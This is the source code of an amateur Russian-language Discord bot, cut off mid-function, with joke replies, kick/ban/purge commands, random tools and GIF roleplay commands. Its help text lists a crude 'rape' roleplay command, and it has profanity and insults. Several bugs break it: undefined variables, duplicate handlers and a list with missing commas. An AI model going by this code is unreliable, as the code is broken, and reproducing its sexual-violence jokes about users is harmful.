import discord #Импорт дискорда, и других библиотек
from discord.ext import commands
import os, sqlite3
import string
import random
import json
import asyncio
import config
import discordSuperUtils
import sys
from discord.utils import get
import discord as ds
import math
import pymongo as mg
from time import time
from pypresence import Presence
from discord_components import DiscordComponents, Button, ButtonStyle
import datetime
from asyncio import sleep
import youtube_dl
from discord import FFmpegPCMAudio
from requests import put
from asyncio import create_task


intents = discord.Intents.default()

intents.members = True

bot = discord.ext.commands.Bot(command_prefix = ">", intents = intents)
bot.remove_command("help")

BADWORDS = ["лох", "еблан", "уебан", "дибил", "дурак", "даун","пиздюк","пиздабол","гандон","чмо","обоссаный","обосаный","пидр","ебут","ебется","конченый","конченный"]
LINKS = ["https","http","://", "www.", "ru", "org", "com","net", "shop", "de", "uk", "info","nl","eu","pro"]
img_hug = ["https://c.tenor.com/9e1aE_xBLCsAAAAC/anime-hug.gif", "https://c.tenor.com/Ct4bdr2ZGeAAAAAC/teria-wang-kishuku-gakkou-no-juliet.gif", "https://c.tenor.com/4n3T2I239q8AAAAC/anime-cute.gif", "https://c.tenor.com/ztEJgrjFe54AAAAC/hug-anime.gif", "https://c.tenor.com/2lr9uM5JmPQAAAAC/hug-anime-hug.gif", "https://c.tenor.com/0vl21YIsGvgAAAAC/hug-anime.gif", "https://c.tenor.com/ItpTQW2UKPYAAAAC/cuddle-hug.gif", "https://c.tenor.com/SXk-WqF6PpQAAAAC/anime-hug.gif", "https://c.tenor.com/X5nBTYuoKpoAAAAC/anime-cheeks.gif", "https://c.tenor.com/SPs0Rpt7HAcAAAAC/chiya-urara.gif", "https://c.tenor.com/mmQyXP3JvKwAAAAC/anime-cute.gif", "https://c.tenor.com/jQ0FcfbsXqIAAAAC/hug-anime.gif", "https://c.tenor.com/z2QaiBZCLCQAAAAC/hug-anime.gif", "https://c.tenor.com/ixaDEFhZJSsAAAAC/anime-choke.gif", "https://c.tenor.com/vkiqyZJWJ4wAAAAC/hug-cat.gif", "https://c.tenor.com/UhcyGsGpLNIAAAAC/hug-anime.gif", "https://c.tenor.com/nmzZIEFv8nkAAAAC/hug-anime.gif", "https://c.tenor.com/sBFE3GeNpJ4AAAAC/tackle-hug-couple.gif", "https://c.tenor.com/WpbZhwwj6zAAAAAC/happy-hug.gif", "https://c.tenor.com/EnfEuWDXthkAAAAC/hug-couple.gif"]

@bot.event
async def on_ready():
    print("Бот готов! ОН НЕ ГОТОВ!")


#фукционал чат бота 
@bot.command() #Команда online
async def онлайн (ctx):
    await ctx.reply('Жалко что я в онлайн...')


@bot.command() #Команда повтори
async def повтори(ctx,  *, arg):
    await ctx.message.delete() 
    await ctx.send(arg,)


@bot.command() #Команда повтори
async def Повтори(ctx,  *, arg):
    await ctx.message.delete() 
    await ctx.send(arg,)


@bot.command() #Команда повтори
async def скажи(ctx,  *, arg):
    await ctx.message.delete() 
    await ctx.send(arg,)


@bot.command() #Команда повтори
async def Скажи(ctx,  *, arg):
    await ctx.message.delete() 
    await ctx.send(arg,)





@bot.command() #Команда test
async def тест2(ctx):
    await ctx.reply('зачем...')
    await message.add.reaction("❓")


@bot.command() #Команда создатели
async def создатели(ctx):
    await ctx.reply('мой создатель qwix')


@bot.command() #Команда фу
async def фу(ctx):
    await ctx.reply('https://cdn.discordapp.com/attachments/848243985973510166/978707702215745536/Screenshot_2022-05-25-00-14-02-34_680d03679600f7af0b4c700c6b270fe7.jpg')


@bot.command() #Команда ваня
async def ваня(ctx):
    await ctx.reply('Ваня? Это тот самый умный человек?')


@bot.command() #Команда галя
async def галя(ctx):
    await ctx.reply('ГАЛЯ не красивая!')


@bot.command() #Команда абобус
async def абобус(ctx):
    await ctx.reply('Нет блин диблотус')

@bot.command() #Команда поцелуй
async def поцелуй(ctx):
    await ctx.reply('нехочу')

@bot.command() #Команда Как дела
async def дела(ctx,):
    await ctx.reply('НАРМАЛЬНА')

@bot.command() #Команда Пока
async def пока(ctx):
    await ctx.reply('https://tenor.com/view/hooray-its-weekend-ok-bye-ciao-slide-gif-15739082')

@bot.command() #Команда дискорд3
async def дискорд(ctx):
    await ctx.reply('скайп лучше')

@bot.command() #Команда абобус
async def токен(ctx):
    await ctx.reply('ti lox prosto')














#Такие же команды. Только с большой буквы

@bot.command() #Команда online
async def Онлайн (ctx):
    await ctx.reply('Я не в онлайн')


@bot.command() #Команда test
async def Тест(ctx):
    await ctx.reply('Мне еще поспать надо?')


@bot.command() #Команда создатели
async def Создатели(ctx):
    await ctx.reply('QWIX Мой создатель')


@bot.command() #Команда фу
async def Фу(ctx):
    await ctx.reply('https://cdn.discordapp.com/attachments/848243985973510166/978707702215745536/Screenshot_2022-05-25-00-14-02-34_680d03679600f7af0b4c700c6b270fe7.jpg')

@bot.command() #Команда ваня
async def Ваня(ctx):
    await ctx.reply('Он красивый')


@bot.command() #Команда галя
async def Галя(ctx):
    await ctx.reply('Эта ваще кто?')


@bot.command() #Команда абобус
async def Абобус(ctx):
    await ctx.reply('Долгобус')

@bot.command() #Команда поцелуй
async def Поцелуй(ctx):
    await ctx.reply('Окей.... https://tenor.com/view/love-gif-24428715')

@bot.command() #Команда Как дела
async def Дела(ctx,):
    await ctx.reply('нармальна')

@bot.command() #Команда Пока
async def Пока(ctx):
    await ctx.reply('https://tenor.com/view/hooray-its-weekend-ok-bye-ciao-slide-gif-15739082')

@bot.command() #Команда дискорд
async def Дискорд(ctx):
    await ctx.reply('вискорд')

@bot.command() #Команда абобус
async def Токен(ctx):
    await ctx.reply('МОЙ ТОКЕН - https://www.youtube.com/watch?v=dQw4w9WgXcQ')


#МОДЕРАЦИЯ


#очистка чата
@bot.command(pass_context=True,name="очистить", brief="Очищает чат, clear кол. сообщений",)
@commands.has_permissions(administrator=True)
async def очистить(ctx,amount = 100 ):
    await ctx.channel.purge(limit=amount)
    message: discord.Message = await ctx.reply(f"Чат был очищен:) С любовью от бота.")

#бан








#кик
@bot.command(pass_context= True)
@commands.has_permissions ( administrator = True)

async def кик (ctx, member: discord.Member, *, reason = None ):
    await ctx.channel.purge( limit= 1 )

    await member.kick( reason = reason )
    await ctx.send(f'Юзер {member.mention} был кикнут✅')


#кик(с большой буквы)
@bot.command(pass_context= True)
@commands.has_permissions ( administrator = True)

async def Кик (ctx, member: discord.Member, *, reason = None ):
    await ctx.channel.purge( limit= 1 )

    await member.kick( reason = reason )
    await ctx.reply( f'Юзер {member.mention} был кикнут✅')
    await my_msg.add_reaction("🎉")


#БАН
@bot.command(pass_context= True)
@commands.has_permissions ( administrator = True)
async def бан (ctx, member: discord.Member, *, reason = None ):
    await ctx.channel.purge( limit= 1 )

    await member.ban( reason = reason )
    await ctx.reply( f'Юзер {member.mention} был забанен✅')
    await my_msg.add_reaction("🎉")


@bot.command() #Команда хелп бан
async def хелп_бан(ctx):
    await ctx.reply('`Используй >бан "member" "reason`"')


@bot.command() #Команда хелп кик
async def хелп_кик(ctx):
    await ctx.reply('`Используй >кик "member" "reason`"')


@bot.command() #Команда хелп кик
async def хелп_очистить(ctx):
    await ctx.reply('`Используй >очистить "кол во сообщений . Используй так: >очистить "кол во сообщений"`"')

@bot.command() #Команда хелп кик
async def хелп_опрос(ctx):
    await ctx.reply('`Используй >опрос "название опроса`"')

@bot.command() #Команда хелп кик
async def хелп_повтори(ctx):
    await ctx.reply('`Используй >повтори "текст сообщения`"')

@bot.command() #Команда хелп кик
async def хелп_аватар(ctx):
    await ctx.reply('`>аватар - показывает твой аватар, если введешь >аватар @akitiltka То покажет аватар человека которого ты ввел. Используй так: >аватар @akitiltka`"')



@bot.command() #Команда хелп кик
async def хелп_сервер(ctx):
    await ctx.reply('`>сервер - показывает статистику сервера. Используй так: >сервер`"')



@bot.command() #Команда хелп кик
async def хелп_шар(ctx):
    await ctx.reply('`>шар "текст". Выбирает на рандом фразы. Используй так: >шар "текст`"')



@bot.command() #Команда хелп кик
async def хелп_число(ctx):
    await ctx.reply('`>число - Рандом число. Используй так: >число`"')

@bot.command() #Команда хелп кик
async def хелп_монетка(ctx):
    await ctx.reply('`>монетка - Подбрасывает монетку. Используй так >монетка`"')

@bot.command() #Команда хелп кик
async def хелп_вопрос(ctx):
    await ctx.reply('`>вопрос - отвечает на рандом Да или Нет . Используй так: >вопрос "вопрос"`"')



#хелп категории

@bot.command() #Команда хелп кик
async def хелп_информация(ctx):
    await ctx.reply('`Информация по разделу ИНФОРМАЦИЯ`\n **Команды** \n `>аватар - показывает аватар участника(хелп_аватар)` \n `>инфо - показывает инфо о боте` \n `>сервер - показывает инфо о сервере(>хелп_сервер)`"')

@bot.command() #Команда хелп кик
async def хелп_модерация(ctx):
    await ctx.reply('`Информация по разделу Модерация`\n **Команды** \n `>опрос - Делает опрос(хелп_опрос)` \n `>бан - Банит участника(хелп_бан)` \n `>кик - Кикает участника`\n `>кик - Кикает участника(хелп_кик)`\n `>очистить - Очищает чат`\n `>повтори - Повторяет сообщение`"')

@bot.command() #Команда хелп кик
async def хелп_рандом(ctx):
    await ctx.reply('`Информация по разделу Рандом`\n **Команды** \n `>шар - Предсказывает будущее(хелп_шар)` \n `>число - Рандомайзер числа(хелп_бан)` \n `>монетка - Подбрасывает монетку, орел или решка(хелп_монетка)`\n `>вопрос - Да или нет?(хелп_вопрос)`"')

@bot.command() #Команда хелп кик
async def хелп_другое(ctx):
    await ctx.reply('`Информация по разделу Другое`\n **Команды** \n `>абобус - Думаю тут коментарии не нужны...` \n `>ваня - Это кто?` \n `>галя - У меня так продавщицу зовут`\n `>дела - Вроде норм дела` \n `>дискорд - Вроде норм дела` \n `>дела - Вроде норм дела` \n `>дискорд - Надеюсь не нитро` \n `>онлайн - бот в онлайн или нет?` \n `>фу - Тут понятно` `>токен - Тут я думаю тоже понятно` `>пока - Привет`"')


#БАН



@bot.event
async def on_ready():
     while True:
         await bot.change_presence(status=discord.Status.online, activity=discord.Game("Бабл квас"))
         await sleep(15)
         await bot.change_presence(status=discord.Status.online,activity=discord.Streaming("Бравл старс"))



#рандом
@bot.command()  #random number
async def число(ctx, *arg):
    await ctx.reply(random.randint(0, 1000))


@bot.command() #random number
async def Число(ctx, *arg):
    await ctx.reply(random.randint(0, 1000))

@bot.command()
async def Шар(ctx):
    await   ctx.reply(random.choice(['Нет❌', 'Да✌','Возможно🤔','Определенно нет!❌','Наверно все таки нет😏,','А теперь сосредоточься и спроси нормально😎']))

@bot.command()
async def шар(ctx):
    await ctx.reply(random.choice(['Нет❌', 'Да✌','Возможно🤔','Определенно нет!❌','Наверно все таки нет😏','А теперь сосредоточься и спроси нормально😎']))

#команда не найдена
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound ):
        await ctx.reply(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x9c0c0))


#хелп

@bot.command()
async def Хелп(ctx):    
        await ctx.send(embed = discord.Embed(description = f'**Доступные команды**\n \n **С помощью этой команды ты можешь узнать команды бота. Префикс бота - > \n Сервер поддержки: https://discord.gg/CVGKjpHjmY** \n\n :clipboard: **Информация** \n `>аватар` `>инфо` `>сервер`\n \n :shield:**Модерация** \n `>опрос` `>бан` `>кик` `>очистить` `>повтори` \n\n :closed_umbrella:**Рандом** \n `>шар` `>число` `>монетка` `>вопрос` \n \n :bone:**Другое** \n `>абобус` `>ваня` `>галя` `>дела` `>дискорд` `>онлайн` `>фу` `>токен` `>пока`\n \n :prince:**RolePlay** \n `>дать_пять` `>поцелуй` `>выебать` `>извиниться` `>испугать` `>укусить` `>шлепнуть` `>понюхать` `>обнять` `>поцеловать` `>лизнуть` `>пнуть` `>погладить` `>похвалить` `>кусь` `>изнасиловать` `>поздравить` \n \n **Если нашли баг в боте, ошибку. Сообщите Akitiltka#5670.** \n **Версия бота - alpha 0.1** \n У каждого раздела / команды есть свой хелп',color=0x3c1c8))

@bot.command()
async def хелп(ctx):
        await ctx.send(embed = discord.Embed(description = f'**Доступные команды**\n \n **С помощью этой команды ты можешь узнать команды бота. Префикс бота - > \n Сервер поддержки: https://discord.gg/CVGKjpHjmY** \n\n :clipboard: **Информация** \n `>аватар` `>инфо` `>сервер`\n \n :shield:**Модерация** \n `>опрос` `>бан` `>кик` `>очистить` `>повтори` \n\n :closed_umbrella:**Рандом** \n `>шар` `>число` `>монетка` `>вопрос` \n \n :bone:**Другое** \n `>абобус` `>ваня` `>галя` `>дела` `>дискорд` `>онлайн` `>фу` `>токен` `>пока`\n \n :prince:**RolePlay** \n `>дать_пять` `>поцелуй` `>выебать` `>извиниться` `>испугать` `>укусить` `>шлепнуть` `>понюхать` `>обнять` `>поцеловать` `>лизнуть` `>пнуть` `>погладить` `>похвалить` `>кусь` `>изнасиловать` `>поздравить` \n \n **Если нашли баг в боте, ошибку. Сообщите Akitiltka#5670.** \n **Версия бота - alpha 0.1** \n У каждого раздела / команды есть свой хелп',color=0x3c1c8))

@bot.command()
async def Помощь(ctx):
        await ctx.send(embed = discord.Embed(description = f'**Доступные команды**\n \n **С помощью этой команды ты можешь узнать команды бота. Префикс бота - > \n Сервер поддержки: https://discord.gg/CVGKjpHjmY** \n\n :clipboard: **Информация** \n `>аватар` `>инфо` `>сервер`\n \n :shield:**Модерация** \n `>опрос` `>бан` `>кик` `>очистить` `>повтори` \n\n :closed_umbrella:**Рандом** \n `>шар` `>число` `>монетка` `>вопрос` \n \n :bone:**Другое** \n `>абобус` `>ваня` `>галя` `>дела` `>дискорд` `>онлайн` `>фу` `>токен` `>пока`\n \n :prince:**RolePlay** \n `>дать_пять` `>поцелуй` `>выебать` `>извиниться` `>испугать` `>укусить` `>шлепнуть` `>понюхать` `>обнять` `>поцеловать` `>лизнуть` `>пнуть` `>погладить` `>похвалить` `>кусь` `>изнасиловать` `>поздравить` \n \n **Если нашли баг в боте, ошибку. Сообщите Akitiltka#5670.** \n **Версия бота - alpha 0.1** \n У каждого раздела / команды есть свой хелп',color=0x3c1c8))
@bot.command()
async def помощь(ctx):
        await ctx.send(embed = discord.Embed(description = f'**Доступные команды**\n \n **С помощью этой команды ты можешь узнать команды бота. Префикс бота - > \n Сервер поддержки: https://discord.gg/CVGKjpHjmY** \n\n :clipboard: **Информация** \n `>аватар` `>инфо` `>сервер`\n \n :shield:**Модерация** \n `>опрос` `>бан` `>кик` `>очистить` `>повтори` \n\n :closed_umbrella:**Рандом** \n `>шар` `>число` `>монетка` `>вопрос` \n \n :bone:**Другое** \n `>абобус` `>ваня` `>галя` `>дела` `>дискорд` `>онлайн` `>фу` `>токен` `>пока`\n \n :prince:**RolePlay** \n `>дать_пять` `>поцелуй` `>выебать` `>извиниться` `>испугать` `>укусить` `>шлепнуть` `>понюхать` `>обнять` `>поцеловать` `>лизнуть` `>пнуть` `>погладить` `>похвалить` `>кусь` `>изнасиловать` `>поздравить` \n \n **Если нашли баг в боте, ошибку. Сообщите Akitiltka#5670.** \n **Версия бота - alpha 0.1** \n У каждого раздела / команды есть свой хелп',color=0x3c1c8))
#аватар

@bot.command()
async def аватар(ctx, member: discord.Member  = None):
    if member == None:#если не упоминать участника тогда выводит аватар автора сообщения
        member = ctx.author
    embed = discord.Embed(color = 0x22ff00, title = f"Аватар участника - {member.name}", description = f"[Нажмите что бы скачать аватар]({member.avatar_url})")
    embed.set_image(url = member.avatar_url)
    await ctx.reply(embed = embed)






#инфо
    @bot.command()
    async def инфо(ctx):
     await ctx.reply(embed = discord.Embed(description = f'Привет! Меня зовут UnicBot. Можно просто Unic. Мой префикс - >.\n Если хочешь побольше узнать обо мне и моих команд \n Введи команду >хелп. \n \n**Удачного дня**', color=0x3c1c8))

#кот
@bot.command()
async def кот(ctx):
    await ctx.reply(random.choice(['Окей https://tenor.com/view/cat-the-cat-he-dance-he-dance-gif-24077288', 'Ага. https://tenor.com/view/is-not-obliged-to-not-obliged-ne-obyazan-%D0%BD%D0%B5%D0%BE%D0%B1%D1%8F%D0%B7%D0%B0%D0%BD-%D1%82%D0%B8%D0%BA%D1%82%D0%BE%D0%BA-gif-23642232','ЩАС. https://tenor.com/view/cat-%D0%BB%D0%B0%D0%B4%D0%BD%D0%BE-%D0%BA%D0%BE%D1%82-zxc-gif-24825030','Держи милашку:) https://tenor.com/view/cat-kitty-gif-24217421','https://tenor.com/view/airplane-ears-cat-kitten-kitty-shocked-gif-24649723','Держи. https://tenor.com/view/%D0%B2%D0%BA%D1%83%D1%81%D0%BD%D0%B0-%D0%BA%D0%BE%D1%82-cat-gif-23767031']))

@bot.command()
async def Кот(ctx):
    await ctx.reply(random.choice(['Окей https://tenor.com/view/cat-the-cat-he-dance-he-dance-gif-24077288', 'Ага. https://tenor.com/view/is-not-obliged-to-not-obliged-ne-obyazan-%D0%BD%D0%B5%D0%BE%D0%B1%D1%8F%D0%B7%D0%B0%D0%BD-%D1%82%D0%B8%D0%BA%D1%82%D0%BE%D0%BA-gif-23642232','ЩАС. https://tenor.com/view/cat-%D0%BB%D0%B0%D0%B4%D0%BD%D0%BE-%D0%BA%D0%BE%D1%82-zxc-gif-24825030','Держи милашку:) https://tenor.com/view/cat-kitty-gif-24217421','https://tenor.com/view/airplane-ears-cat-kitten-kitty-shocked-gif-24649723','Держи. https://tenor.com/view/%D0%B2%D0%BA%D1%83%D1%81%D0%BD%D0%B0-%D0%BA%D0%BE%D1%82-cat-gif-23767031']))

@bot.command()
async def Монетка(ctx):
    await ctx.reply(random.choice(['**Подбрасываю......Решка!**', '**Подбрасываю....Орел!**']))

@bot.command()
async def монетка(ctx):
    await ctx.reply(random.choice(['**Подбрасываю......Решка!**', '**Подбрасываю....Орел!**']))

@bot.event
async def on_ready():
    print("Бот запущен")

#инфо
@bot.command()
async def инфо(ctx):
     await ctx.reply(embed = discord.Embed(description = f'Привет! Меня зовут UnicBot. Можно просто Unic. Мой префикс - >.\n Если хочешь побольше узнать обо мне и моих команд \n Введи команду >хелп. \n \n**Удачного дня**', color=0x3c1c8))



#информация о сервере
@bot.command(aliases = ['сервер'])
async def server(ctx):       
    embed = discord.Embed(  
        description = f'**Информация о сервере** **{ctx.guild.name}**\n'
                      f'\n'
                      f'**Участники:**\n'
                      f'Людей: **{ctx.guild.member_count}**\n'
                      f'\n'
                      f'**Каналы:**\n'
                      f'Текствые: **{len(ctx.guild.text_channels)}**\n'
                      f'Голосовые: **{len(ctx.guild.voice_channels)}**\n'
                      f'Категории: **{len(ctx.guild.categories)}**\n'
                      f'\n'
                      f'**Уровень проверки:**\n'
                      f'{ctx.guild.verification_level}\n'
                      f'**Дата создания:**\n{ctx.guild.created_at.strftime("%d.%m.%Y")}\n',
                     color=ctx.author.color,)
    embed.set_footer(text = f'ID: {ctx.guild.id}')
    embed.set_thumbnail(url = str(ctx.guild.icon_url))
    await ctx.send(embed=embed)





gif = [
      "https://tenor.com/view/wealth-gif-24406365"
      "https://tenor.com/view/money-rain-wow-mr-krabs-shower-coins-gif-14598486"
      "https://tenor.com/view/the-wolf-of-wall-street-gif-18329156"
      "https://tenor.com/view/spongebob-homework-gif-4246979"
      "https://tenor.com/view/spongebob-mocking-chicken-trending-meme-gif-8617355"
      "https://tenor.com/view/spongebob-nickelodeon-handsome-squidward-funny-meme-gif-14625359"
      "https://tenor.com/view/kisses-kiss-mwah-muah-heart-gif-13400006"
      "https://tenor.com/view/love-gif-24630712"
      "https://tenor.com/view/lovely-cats-love-gif-24382294"
      "https://tenor.com/view/actions-speak-louder-than-words-ultimate-cowboy-showdown-actions-matter-more-than-words-actions-are-more-important-than-words-trace-adkins-gif-20685149"
      "https://tenor.com/view/sad-eyes-sadface-gif-18467844"
      "https://tenor.com/view/dirt-alone-upset-lonely-kick-gif-22236520"
      "гhttps://tenor.com/view/nufc-newcastle-united-allan-saintmaximin-gif-25468886"
      "https://tenor.com/view/eddie-howe-nufc-newcastle-united-gif-24825110"
      "https://tenor.com/view/eddie-miami-vice-gif-17977320"
      "https://tenor.com/view/the-muppets-animal-drum-play-crazy-gif-14698765"
]

@bot.command() 
async def гифка(ctx): 
    author = ctx.message.author

    await ctx.reply(random.choice(gif))

#roleplay


@bot.command()
async def обнять(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел объять.\nПопробуй так: `>обнять @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} обнял {member.mention}")
    embed.set_image(url=f'{random.choice(img_hug)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)
@bot.command()
async def Обнять(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел объять.\nПопробуй так: `>обнять @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} обнял {member.mention}")
    embed.set_image(url=f'{random.choice(img_hug)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


#инфо о участнике

@bot.command()
async def пользователь(ctx,member:discord.Member = None, guild: discord.Guild = None):
    if member == None:
        emb = discord.Embed(title="Информация о пользователе", color=ctx.message.author.color)
        emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)

        emb.add_field(name="Роль на сервере:", value=f"{ctx.message.author.top_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        emb.set_thumbnail(url=ctx.message.author.avatar_url)
        await ctx.send(embed = emb)
    else:
        emb = discord.Embed(title="Информация о пользователе", color=member.color)
        emb.add_field(name="Имя:", value=member.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=member.id,inline=False)
        emb.add_field(name="Роль на сервере:", value=f"{member.all_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        await ctx.send(embed = emb)

@bot.command()
async def Пользователь(ctx,member:discord.Member = None, guild: discord.Guild = None):
    if member == None:
        emb = discord.Embed(title="Информация о пользователе", color=ctx.message.author.color)
        emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)

        emb.add_field(name="Роль на сервере:", value=f"{ctx.message.author.top_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        emb.set_thumbnail(url=ctx.message.author.avatar_url)
        await ctx.send(embed = emb)
    else:
        emb = discord.Embed(title="Информация о пользователе", color=member.color)
        emb.add_field(name="Имя:", value=member.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=member.id,inline=False)
        emb.add_field(name="Роль на сервере:", value=f"{member.all_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        await ctx.send(embed = emb)



@bot.command()
async def выебать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел выебать.\nПопробуй так: `>выебать @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} выебал {member.mention}")
    embed.set_image(url=f'{random.choice(img_ebat)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


img_ebat = ["https://c.tenor.com/bJsaBdhEwS8AAAAS/fuck-you-kick-ass.gif", "https://c.tenor.com/Cbds_gTXfCcAAAAC/kick.gif","https://c.tenor.com/sWGfjLcAEDwAAAAC/kick-cartoon.gif","https://c.tenor.com/POPKh_t04c0AAAAS/bad-mom-grandma.gif","https://c.tenor.com/4RIbgFCLRrUAAAAd/rikka-takanashi-bad-girl.gif","https://c.tenor.com/vtwqHfJo7dcAAAAS/free-anime.gif","https://c.tenor.com/x7zgYTC5tekAAAAd/anime-sand-hill.gif","https://c.tenor.com/uUqm-NBftk0AAAAS/knocking-head-stupid.gif"]


@bot.command()
async def Выебать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел выебать.\nПопробуй так: `>выебать @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} выебал {member.mention}")
    embed.set_image(url=f'{random.choice(img_ebat)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



#ДАЙ ПЯТЬ

@bot.command()
async def дать_пять(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел дать пять.\nПопробуй так: `>дай_пять @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} Дал пять участнику {member.mention}")
    embed.set_image(url=f'{random.choice(img_Pyat)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

img_Pyat = ["https://c.tenor.com/RusIdB6WS-IAAAAC/cat-high-five.gif","https://c.tenor.com/JBBZ9mQntx8AAAAS/anime-high-five.gif","https://c.tenor.com/7KVY_BxUWbEAAAAS/high-five-anime.gif","https://c.tenor.com/mpCnVpX0xIYAAAAC/high-five-spongebob.gif","https://c.tenor.com/VaOkUsy8UjMAAAAS/hi-five-high-five.gif","https://c.tenor.com/TJs8RfplhWIAAAAS/naruto-shippuuden.gif","https://c.tenor.com/yePcFllCRwAAAAAS/belle-anime-nice-work.gif","https://c.tenor.com/SQWJiYKV3x4AAAAS/negima-magister-negi.gif","https://c.tenor.com/OjxdWucxp04AAAAS/ascendance-of-a-bookworm-honzuki-no-gekokujou.gif","https://c.tenor.com/AlFl2dckMe4AAAAS/fresh-precure-high-five.gif"]


@bot.command()
async def Дать_Пять(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел дать пять.\nПопробуй так: `>дай_пять @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} Дал пять участнику {member.mention}")
    embed.set_image(url=f'{random.choice(img_Pyat)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


#испугать

@bot.command()
async def испугать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел ИСПУГАТЬ!.\nПопробуй так: `>испугать @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Видимо {member.mention} слишком испугался")
    embed.set_image(url=f'{random.choice(img_Foor)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

img_Foor = ["https://c.tenor.com/RhyxCbENd6YAAAAM/umaru-chan-scared.gif","https://c.tenor.com/oDaR_1ydefIAAAAM/scared-anime.gif","https://c.tenor.com/yCQNCPxF_ksAAAAM/scared-anime.gif","https://c.tenor.com/wdlPI-IMU44AAAAM/going-crazy-toilet-paper-shortage.gif","https://c.tenor.com/y5_nN0mVm7EAAAAM/scared.gif","https://c.tenor.com/m3hU0lQpvgYAAAAM/yuko-yoshida.gif","https://c.tenor.com/sJsMTbNky1gAAAAM/scared-face-shirou.gif","https://c.tenor.com/LOQG6CSd_lQAAAAM/pokemon-cute.gif","https://c.tenor.com/8G8ZZg5e-McAAAAM/creepy-eye-anime.gif","https://c.tenor.com/GnqphCoc8zEAAAAM/anime-baby.gif","https://c.tenor.com/TffcsLG7VAYAAAAS/slow-loop-anime-blush.gif","https://c.tenor.com/Edm5vql1ln0AAAAS/anime-blink.gif"]

@bot.command()
async def ИСПУГАТЬ(ctx):
        await ctx.send("`не капси!`")

@bot.command()
async def Испугать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел ИСПУГАТЬ!.\nПопробуй так: `>испугать @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Видимо {member.mention} слишком испугался")
    embed.set_image(url=f'{random.choice(img_Foor)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


#ИЗВИНИТЬСЯ

@bot.command()
async def извиниться(ctx, member: discord.Member = None, amount = 1):
